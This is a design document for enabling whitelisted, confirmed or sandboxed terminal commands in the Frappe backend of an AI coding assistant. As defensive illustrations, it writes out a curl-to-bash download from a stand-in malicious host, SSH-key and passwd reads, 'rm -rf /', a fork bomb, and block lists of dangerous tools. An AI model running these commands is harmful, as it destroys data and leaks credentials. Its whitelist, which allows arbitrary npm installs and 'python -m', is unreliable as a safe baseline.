# Backend Fix: Enable Terminal Commands

## Date
2025-10-19

## Overview

The Oropendola AI backend (Frappe-based) is currently **blocking terminal commands** for security. This document explains:

1. **Why** commands are blocked
2. **Where** the blocking happens
3. **How** to enable them safely
4. **Security** best practices

---

## Current Backend Architecture

### Technology Stack
- **Framework**: Frappe Framework (Python)
- **API**: REST API with session-based authentication
- **Endpoints**: `/api/method/ai_assistant.api.*`

### Key API Endpoint
```python
# Backend endpoint that handles tool execution
/api/method/ai_assistant.api.execute_tool_call
```

---

## Why Terminal Commands Are Blocked

### Security Risks

1. **Arbitrary Code Execution**
   ```bash
   # Malicious example
   rm -rf /
   curl malicious-site.com/malware.sh | bash
   ```

2. **System Access**
   ```bash
   # Could access sensitive data
   cat /etc/passwd
   cat ~/.ssh/id_rsa
   ```

3. **Resource Abuse**
   ```bash
   # Could consume resources
   :(){ :|:& };:  # Fork bomb
   while true; do echo "spam"; done
   ```

4. **Dependency Installation**
   ```bash
   # Could install malicious packages
   npm install evil-package
   pip install backdoor-lib
   ```

---

## Backend Code Structure

### Likely File Structure (Frappe App)
```
frappe-bench/
└── apps/
    └── ai_assistant/
        ├── ai_assistant/
        │   ├── __init__.py
        │   ├── api/
        │   │   ├── __init__.py
        │   │   └── chat.py          # Main chat endpoint
        │   └── utils/
        │       ├── __init__.py
        │       └── tool_executor.py  # Tool execution logic
        ├── setup.py
        └── hooks.py
```

### Current Implementation (Blocking Commands)

**File**: `ai_assistant/ai_assistant/api/chat.py` or `tool_executor.py`

```python
import frappe
from frappe import _

@frappe.whitelist(allow_guest=False)
def execute_tool_call(action, path=None, content=None, **kwargs):
    """
    Execute a tool call from the AI
    
    Allowed actions:
    - create_file
    - edit_file
    - read_file
    - delete_file
    
    Blocked actions:
    - run_in_terminal (SECURITY RISK)
    """
    
    # CURRENT CODE: Blocks terminal commands
    if action == "run_in_terminal":
        frappe.throw(
            _("Terminal commands are not allowed for security reasons"),
            frappe.PermissionError
        )
    
    if action == "create_file":
        return create_file_handler(path, content)
    
    elif action == "edit_file":
        return edit_file_handler(path, content)
    
    elif action == "read_file":
        return read_file_handler(path)
    
    elif action == "delete_file":
        return delete_file_handler(path)
    
    else:
        frappe.throw(
            _("Unknown action: {}").format(action),
            frappe.ValidationError
        )
```

---

## How to Enable Terminal Commands (Backend Fix)

### Option 1: Whitelist-Based Approach (RECOMMENDED)

Only allow **safe** commands that you explicitly whitelist.

**File**: `ai_assistant/ai_assistant/utils/tool_executor.py`

```python
import frappe
import subprocess
import shlex
from frappe import _

# Whitelist of allowed commands
ALLOWED_COMMANDS = {
    "npm": ["install", "start", "run", "test", "build"],
    "node": ["--version", "-v"],
    "python": ["--version", "-V"],
    "git": ["status", "log", "branch", "diff"],
    "ls": ["-la", "-l", "-a"],
    "pwd": [],
    "echo": [],
}

# Blacklist of dangerous commands
BLOCKED_COMMANDS = [
    "rm", "rmdir", "del", "format",
    "sudo", "su", "chmod", "chown",
    "wget", "curl",  # Could download malicious code
    "eval", "exec",
    "shutdown", "reboot", "poweroff",
]

@frappe.whitelist(allow_guest=False)
def execute_tool_call(action, path=None, content=None, command=None, **kwargs):
    """Execute a tool call with security controls"""
    
    if action == "run_in_terminal":
        # NEW CODE: Allow whitelisted terminal commands
        return execute_terminal_command(command)
    
    elif action == "create_file":
        return create_file_handler(path, content)
    
    # ... other actions ...

def execute_terminal_command(command):
    """
    Execute a terminal command with security controls
    
    Args:
        command (str): Command to execute
        
    Returns:
        dict: Result with stdout, stderr, and exit code
    """
    
    if not command:
        frappe.throw(_("Command is required"), frappe.ValidationError)
    
    # Parse command safely
    try:
        cmd_parts = shlex.split(command)
    except ValueError as e:
        frappe.throw(_("Invalid command syntax: {}").format(str(e)))
    
    if not cmd_parts:
        frappe.throw(_("Empty command"))
    
    base_command = cmd_parts[0]
    
    # Check if command is blocked
    if base_command in BLOCKED_COMMANDS:
        frappe.throw(
            _("Command '{}' is blocked for security reasons").format(base_command),
            frappe.PermissionError
        )
    
    # Check if command is whitelisted
    if base_command in ALLOWED_COMMANDS:
        allowed_args = ALLOWED_COMMANDS[base_command]
        
        # If whitelist has specific args, validate them
        if allowed_args:
            if len(cmd_parts) < 2 or cmd_parts[1] not in allowed_args:
                frappe.throw(
                    _("Command '{}' with args '{}' is not allowed").format(
                        base_command, 
                        ' '.join(cmd_parts[1:])
                    )
                )
    else:
        frappe.throw(
            _("Command '{}' is not whitelisted").format(base_command),
            frappe.PermissionError
        )
    
    # Additional security: Check for dangerous patterns
    dangerous_patterns = ["|", ">", "<", "&&", "||", ";", "$", "`", "$("]
    for pattern in dangerous_patterns:
        if pattern in command:
            frappe.throw(
                _("Command contains dangerous pattern: {}").format(pattern),
                frappe.PermissionError
            )
    
    # Execute the command
    try:
        result = subprocess.run(
            cmd_parts,
            capture_output=True,
            text=True,
            timeout=30,  # 30 second timeout
            check=False,  # Don't raise exception on non-zero exit
            cwd=get_safe_workspace_path()  # Limit to safe directory
        )
        
        return {
            "success": result.returncode == 0,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "exit_code": result.returncode,
            "command": command
        }
        
    except subprocess.TimeoutExpired:
        frappe.throw(_("Command timed out after 30 seconds"))
    
    except Exception as e:
        frappe.log_error(f"Terminal command error: {str(e)}")
        frappe.throw(_("Failed to execute command: {}").format(str(e)))

def get_safe_workspace_path():
    """
    Get a safe workspace path where commands can be executed
    
    Returns:
        str: Safe directory path
    """
    # Get user's workspace directory from session
    workspace_path = frappe.session.get("workspace_path")
    
    if not workspace_path:
        # Default to a safe temp directory
        import tempfile
        workspace_path = tempfile.gettempdir()
    
    # Validate path is safe (within allowed directories)
    import os
    workspace_path = os.path.abspath(workspace_path)
    
    # Ensure it's not a system directory
    system_dirs = ["/bin", "/sbin", "/etc", "/usr", "/var", "/sys", "/proc"]
    for sys_dir in system_dirs:
        if workspace_path.startswith(sys_dir):
            frappe.throw(_("Cannot execute commands in system directory"))
    
    return workspace_path
```

---

### Option 2: User Confirmation Approach

Require user to confirm each command before execution.

**File**: `ai_assistant/ai_assistant/api/chat.py`

```python
@frappe.whitelist(allow_guest=False)
def request_command_confirmation(command):
    """
    Request user confirmation before executing command
    
    Returns a token that can be used to execute the command
    """
    import secrets
    
    # Generate a one-time token
    token = secrets.token_urlsafe(32)
    
    # Store in cache with 5 minute expiry
    frappe.cache().set(
        f"cmd_token:{token}",
        {
            "command": command,
            "user": frappe.session.user,
            "timestamp": frappe.utils.now()
        },
        expires_in_sec=300  # 5 minutes
    )
    
    return {
        "token": token,
        "command": command,
        "message": "Please confirm this command"
    }

@frappe.whitelist(allow_guest=False)
def execute_confirmed_command(token):
    """Execute a command that was previously confirmed"""
    
    # Get command from cache
    cmd_data = frappe.cache().get(f"cmd_token:{token}")
    
    if not cmd_data:
        frappe.throw(_("Invalid or expired token"))
    
    if cmd_data["user"] != frappe.session.user:
        frappe.throw(_("Token belongs to different user"))
    
    command = cmd_data["command"]
    
    # Delete token (one-time use)
    frappe.cache().delete(f"cmd_token:{token}")
    
    # Execute the command
    return execute_terminal_command(command)
```

---

### Option 3: Sandbox Environment (MOST SECURE)

Execute commands in an isolated Docker container.

**File**: `ai_assistant/ai_assistant/utils/sandbox_executor.py`

```python
import frappe
import docker
from frappe import _

@frappe.whitelist(allow_guest=False)
def execute_in_sandbox(command, workspace_files=None):
    """
    Execute command in isolated Docker container
    
    Args:
        command (str): Command to execute
        workspace_files (dict): Files to mount in container
        
    Returns:
        dict: Execution result
    """
    
    client = docker.from_env()
    
    try:
        # Create temporary container
        container = client.containers.run(
            image="node:18-alpine",  # Or python:3.11-alpine
            command=command,
            detach=True,
            remove=True,
            network_mode="none",  # No network access
            mem_limit="512m",  # 512MB RAM limit
            cpu_period=100000,
            cpu_quota=50000,  # 50% CPU limit
            security_opt=["no-new-privileges"],
            read_only=True,  # Read-only filesystem
            tmpfs={"/tmp": "rw,noexec,nosuid,size=100m"},
            working_dir="/workspace",
            volumes={
                create_temp_workspace(workspace_files): {
                    "bind": "/workspace",
                    "mode": "rw"
                }
            }
        )
        
        # Wait for completion (max 30 seconds)
        result = container.wait(timeout=30)
        
        # Get output
        stdout = container.logs(stdout=True, stderr=False)
        stderr = container.logs(stdout=False, stderr=True)
        
        return {
            "success": result["StatusCode"] == 0,
            "stdout": stdout.decode("utf-8"),
            "stderr": stderr.decode("utf-8"),
            "exit_code": result["StatusCode"]
        }
        
    except docker.errors.ContainerError as e:
        frappe.log_error(f"Container error: {str(e)}")
        frappe.throw(_("Command failed in sandbox"))
    
    except docker.errors.ImageNotFound:
        frappe.throw(_("Docker image not found"))
    
    except Exception as e:
        frappe.log_error(f"Sandbox error: {str(e)}")
        frappe.throw(_("Sandbox execution failed"))
    
    finally:
        # Cleanup
        try:
            container.remove(force=True)
        except:
            pass

def create_temp_workspace(files):
    """Create temporary workspace directory with files"""
    import tempfile
    import os
    
    temp_dir = tempfile.mkdtemp(prefix="oropendola_sandbox_")
    
    if files:
        for filepath, content in files.items():
            full_path = os.path.join(temp_dir, filepath)
            os.makedirs(os.path.dirname(full_path), exist_ok=True)
            
            with open(full_path, 'w') as f:
                f.write(content)
    
    return temp_dir
```

---

## Implementation Steps

### Step 1: Update Backend Code

1. **Access your Frappe backend**:
   ```bash
   cd frappe-bench
   bench get-app ai_assistant
   ```

2. **Edit the tool executor**:
   ```bash
   nano apps/ai_assistant/ai_assistant/api/chat.py
   ```

3. **Add the whitelist-based executor** (from Option 1 above)

4. **Test the changes**:
   ```bash
   bench restart
   ```

### Step 2: Update API Response

Modify the backend to return proper success/error responses:

```python
# Before (blocking)
if action == "run_in_terminal":
    frappe.throw("Command Not Allowed", frappe.PermissionError)

# After (executing)
if action == "run_in_terminal":
    result = execute_terminal_command(command)
    return {
        "success": True,
        "message": f"Command executed: {command}",
        "data": result
    }
```

### Step 3: Update Frontend to Handle Results

**File**: `src/core/ConversationTask.js`

Update to show terminal output in the UI:

```javascript
// Handle tool execution result
if (toolCall.action === 'run_in_terminal' && result.stdout) {
    console.log('📟 Terminal output:', result.stdout);
    
    // Show in UI
    vscode.window.showInformationMessage(
        `✅ Command executed: ${toolCall.command}\n\n${result.stdout}`
    );
}
```

---

## Security Best Practices

### 1. Always Use Whitelist
```python
# Good: Whitelist specific commands
ALLOWED_COMMANDS = {
    "npm": ["install", "start", "test"],
    "git": ["status", "log"]
}

# Bad: Allow all commands
# NEVER DO THIS
subprocess.run(user_input, shell=True)  # DANGEROUS!
```

### 2. Validate Arguments
```python
# Good: Validate command arguments
if cmd_parts[1] not in ALLOWED_COMMANDS[base_command]:
    raise PermissionError("Argument not allowed")

# Bad: Allow any arguments
# Don't trust user input
```

### 3. Set Timeouts
```python
# Good: Timeout after 30 seconds
result = subprocess.run(
    cmd_parts,
    timeout=30
)

# Bad: No timeout (could hang forever)
result = subprocess.run(cmd_parts)
```

### 4. Limit Working Directory
```python
# Good: Execute only in safe directory
result = subprocess.run(
    cmd_parts,
    cwd="/safe/workspace/path"
)

# Bad: Allow system-wide execution
result = subprocess.run(cmd_parts, cwd="/")
```

### 5. Log Everything
```python
# Always log command execution
frappe.log_action({
    "action": "terminal_command",
    "user": frappe.session.user,
    "command": command,
    "result": result.returncode
})
```

---

## Testing the Fix

### 1. Test Allowed Commands
```bash
# Should work
npm install
npm start
git status
```

### 2. Test Blocked Commands
```bash
# Should be blocked
rm -rf /
sudo reboot
curl malicious.com
```

### 3. Test Edge Cases
```bash
# Should be blocked (dangerous patterns)
npm install && rm -rf /
echo "test" | malicious-command
$(dangerous-command)
```

---

## Configuration File (Optional)

Create a config file for command whitelist:

**File**: `ai_assistant/config/allowed_commands.json`

```json
{
  "allowed_commands": {
    "npm": {
      "args": ["install", "start", "run", "test", "build"],
      "timeout": 300,
      "description": "Node package manager"
    },
    "node": {
      "args": ["--version", "-v"],
      "timeout": 10,
      "description": "Node.js runtime"
    },
    "python": {
      "args": ["--version", "-V", "-m"],
      "timeout": 10,
      "description": "Python interpreter"
    },
    "git": {
      "args": ["status", "log", "branch", "diff", "fetch"],
      "timeout": 30,
      "description": "Git version control"
    }
  },
  "blocked_commands": [
    "rm", "rmdir", "del", "format",
    "sudo", "su", "chmod", "chown",
    "wget", "curl", "eval", "exec"
  ],
  "max_timeout": 300,
  "safe_directories": [
    "/workspace",
    "/home/*/projects"
  ]
}
```

Load in Python:

```python
import json
import os

def load_command_config():
    """Load allowed commands from config file"""
    config_path = os.path.join(
        frappe.get_app_path("ai_assistant"),
        "config",
        "allowed_commands.json"
    )
    
    with open(config_path) as f:
        return json.load(f)

COMMAND_CONFIG = load_command_config()
```

---

## Summary

### ✅ Recommended Approach

**Use Option 1: Whitelist-Based** with these security measures:

1. ✅ **Whitelist safe commands** only (npm, git, node, python)
2. ✅ **Validate arguments** for each command
3. ✅ **Set timeouts** (30 seconds max)
4. ✅ **Limit working directory** to user workspace
5. ✅ **Block dangerous patterns** (pipes, redirects, command substitution)
6. ✅ **Log all executions** for audit trail
7. ✅ **Return proper errors** when blocked

### 🔒 Security Checklist

- [ ] Commands are whitelisted, not blacklisted
- [ ] Arguments are validated
- [ ] Timeouts are set
- [ ] Working directory is restricted
- [ ] Dangerous patterns are blocked
- [ ] All executions are logged
- [ ] Errors are handled properly
- [ ] No shell=True in subprocess calls
- [ ] Input is validated with shlex.split()

---

## Next Steps

1. **Implement Option 1** on your backend
2. **Test with safe commands** (npm install)
3. **Verify blocking** of dangerous commands
4. **Update frontend** to handle results
5. **Deploy and monitor** for issues

This will enable terminal commands **safely** without compromising security! 🔒✅
